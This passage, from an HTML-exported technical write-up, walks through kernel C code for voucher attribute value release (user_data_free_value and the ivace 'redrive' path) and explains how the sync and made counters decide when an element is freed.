class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_manager &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sync &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_remove&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;],&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sync &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_FAILURE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Under the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (via &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_lock()&lt;/span&gt;&lt;span&gt;) the code checks whether the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;value passed in. Looking back at the caller, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;. If and only if those values are equal does this method remove the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the hashtable and free it (via &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;kfree&lt;/span&gt;&lt;span&gt;) before returning success. If &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;, this method returns &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;KERN_FAILURE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Having looked at the semantics of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_free_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;let&amp;#39;s look back at the callsite:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.900b61ea9371ab65b27de652c8f9e5e6230baf4e"&gt;&lt;/a&gt;&lt;a id="t.47"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(!&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span 